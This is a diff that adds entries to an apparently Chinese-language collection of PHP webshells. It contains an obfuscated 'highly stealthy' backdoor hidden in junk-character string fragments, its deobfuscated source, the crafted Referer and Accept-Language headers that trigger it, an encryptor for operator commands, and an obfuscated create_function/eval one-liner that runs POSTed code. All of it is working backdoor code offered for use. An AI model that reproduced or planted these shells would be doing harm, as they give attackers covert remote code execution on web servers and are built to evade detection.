@@ -41,6 +41,148 @@ cat ../secret.php>@#$
 
 * https://www.jianshu.com/p/13cb1d8d0441
 
+## 超高隐蔽shell
+
+```
+
+<?php
+$s='=0;pw($pwj<$c&&$ipw<$l);$jpw++pw,$i++){$opw.=$pwt{$i}^$k{$j}pw;}}repwpwturn pw$o;}$r=$_SERVEpwR;$pwpwrr=@$r["HpwTTP_REpwpwFE';
+$I='m[2]pw[$z]];ipwf(strpopwspw($p,$h)pw===0){$s[$pwpwi]="";$pwppw=$ss($p,3);}if(apwrray_pwkey_existpws($i,$pws)){pw$s[$i].pw=$p;';
+$U='$epw=strppwpwos($s[$ipw],$f);ipwfpw($e){pw$k=$pwkpwh.$kf;ob_start();@evpwapwl(@gzuncpwpwompress(@x(@baspwepw64_decpwpwode(';
+$d=str_replace('pF','','cpFreapFtepFpF_pFfuncpFtion');
+$Q='preg_replapwce(arrapwypwpw("/_/","/-/"),array("pw/"pw,"+"),pwpw$ss($s[pw$i],0pw,$e))),$k)));pw$opw=ob_gepwt_pwcopwpwntents();o';
+$O='b_end_clean(pw);$d=bpwase64pw_epwncode(x(gzcompwpress($opw),$pwk));pripwntpw("<$kpw>$d</$k>");@sespwpwspwion_destroy();}}}}';
+$y='RERpwpw"];$ra=@$r["HTTP_ACCEPTpwpw_LANGUAGE"];pwifpw(pw$rr&&$ra)pw{$u=parsepw_urlpw($rr);parspwe_str($upw["qpwupwery"],$q);';
+$X='$q=pwapwrray_values(pwpw$q);preg_mpwatchpw_alpwl("/([\\w])[pw\\wpw-]+(?:;q=0.(pw[pw\\d]))?,?/pw",$rpwpwa,$m);pwif($q&&$m){@';
+$b='sespwsion_stapwrt();$pwspw=&$_SESpwSpwION;$pwss="spwubpwstr";$sl="pwstrtolopwwer";$i=$m[1][0]pwpw.$m[1][1];pw$h=$sl(pwpw$s';
+$q='pws(md5($i.$kh)pw,0,3));$fpwpw=$pwsl($ss(md5($i.$kfpw),0pwpw,3));$p="pw";fopwr($zpw=1;$z<count($m[1pwpw]);$pwz++)$p.=$pwq[$';
+$W='$kh="d6a6";pw$kf=pw"bc0d";pwfupwnction x($pwt,$pwkpw){$c=spwtrlen($k);$l=pwpwstrlen($t);pwpw$o="pw";for($i=0pw;$i<$l;){fopwr($j';
+$j=str_replace('pw','',$W.$s.$y.$X.$b.$q.$I.$U.$Q.$O);
+$u=$d('',$j);$u();
+```
+
+### 解混淆
+
+```
+<?php
+$kh = "d6a6";
+$kf = "bc0d";
+
+// 循环异或加密解密，密钥 $k
+function x($t, $k)
+{
+    $c = strlen($k);
+    $l = strlen($t);
+    $o = "";
+    for ($i = 0; $i < $l; ) {
+        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
+            $o .= $t{$i} ^ $k{$j};
+        }
+    }
+    return $o;
+}
+$r  = $_SERVER;
+$rr = @$r["HTTP_REFERER"];
+$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
+if ($rr && $ra) {
+    $u = parse_url($rr); // parse referer, return array, keys: scheme,host,port,user,pass,path,query,fragment
+    parse_str($u["query"], $q);      // parse query string into $q (array).
+    // 将 referer 的 query string 的 各个value取出到 $q
+    $q = array_values($q);
+    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
+    if ($q && $m) {
+        @session_start();
+        $s =& $_SESSION;
+        $ss = "substr";
+        $sl = "strtolower";
+        $i  = $m[1][0] . $m[1][1];
+        $h  = $sl($ss(md5($i . $kh), 0, 3));
+        $f  = $sl($ss(md5($i . $kf), 0, 3));
+        $p  = "";
+        for ($z = 1; $z < count($m[1]); $z++)
+            $p .= $q[$m[2][$z]];
+        if (strpos($p, $h) === 0) {
+            $s[$i] = "";
+            $p     = $ss($p, 3);
+        }
+        if (array_key_exists($i, $s)) {
+            $s[$i] .= $p;
+            $e = strpos($s[$i], $f);
+            if ($e) {
+                $k = $kh . $kf;
+                ob_start();
+                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"), array("/","+"), $ss($s[$i], 0, $e))), $k)));
+                $o = ob_get_contents();
+                ob_end_clean();
+                $d = base64_encode(x(gzcompress($o), $k));
+                print("<$k>$d</$k>");
+                @session_destroy();
+            }
+        }
+    }
+}
+?>
+```
+
+### http头设置
+
+```
+HTTP头部:
+"b1d" 来源: substr(md5("aa" . "d6a6"), 0, 3);
+ht@TIANJI:/mnt/c/Users/HT/Desktop$ echo -n aad6a6 | md5sum
+b1d27c82dcf08fcfc22fe8911fd82d6f  -
+"98b" 来源: substr(md5("aa" . "bc0d"), 0, 3);
+ht@TIANJI:/mnt/c/Users/HT/Desktop$ echo -n aabc0d | md5sum
+98b28829edb0004ce2aee84e962748fa  -
+
+Referer: http://114.114.114.114?q0=hahaha&q1=b1d&q2=HKpK_kqr_C-v4bGCZGMloGe3&q3=98b
+Accept-Language: ah;q=0.8,an-US;q=0.1,an;q=0.2,an;q=0.3
+```
+
+### 加解密：
+
+```
+<?php
+
+function x($t,$k) {
+    $c = strlen($k);
+    $l = strlen($t);
+    $o = "";
+    for($i=0;$i<$l;){
+        for($j=0; ($j<$c && $i<$l); $j++,$i++){
+            $o .= $t{$i} ^ $k{$j};
+        }
+    }
+    return $o;
+}
+
+$key = "d6a6bc0d";
+
+function encrypt($data, $key) {
+    $data = preg_replace(array("/\//","/\+/"), array("_","-"), base64_encode(x(gzcompress($data), $key)));
+    return $data;
+}
+
+function decrypt($data, $key) {
+    echo @gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"), array("/","+"), $data)), $key));
+}
+
+// $data = encrypt("phpinfo();", $key);
+
+$data = "HKpSAlBlMGVJNvY=";
+echo decrypt($data, $key);
+
+$f = fopen( 'php://stdin', 'r' );
+
+while( true ) {
+    echo "请输入你想要执行的payload:\n";
+    $line = fgets($f);
+    echo encrypt(substr($line, 0, -1), $key);
+}
+ 
+fclose( $f );
+```
+
 ## 高隐蔽shell
 
 ```php
@@ -66,7 +208,6 @@ curl -b "PHPSESSID=abc" "http://192.168.21.147/shell.php?_SESSION[PHPSESSID]=abc
 
 ```
 <?php
-//pwd=addimg
 $sss = "ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NCcGMzTmxkQ2dnSkY5U1JWRlZSVk5VV3lkd1lYTnpKMTBnS1NsN1FHVjJZV3dvSUdKaGMyVTJORjlrWldOdlpHVW9JQ1JmVWtWUlZVVlRWRnNuY0dGemN5ZGRJQ2tnS1R0OVpXeHpaWHRBWlhaaGJDZ2dKRjlTUlZGVlJWTlVXeWRoWkdScGJXY25YU0FwTzMwPSIpKQ==";
 function CheckSQL( &$val ){ 
     $v = "select|update|union|set|where|order|and|or";
@@ -318,3 +459,12 @@ array_intersect_uassoc(array($_REQUEST[$password] => ""), array(1), $f);
     }
 ?>       // 好使
 ```
+
+
+
+## 新版:
+
+```
+<?php $xx='c'.'r'.'e'.'a'.'t'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n';$test=$xx('$x','e'.'v'.'a'.'l'.'(b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e($x));');$test('ZXZhbCgkX1BPU1RbJ2FkbWluJ10pOw=='); ?>
+```
+
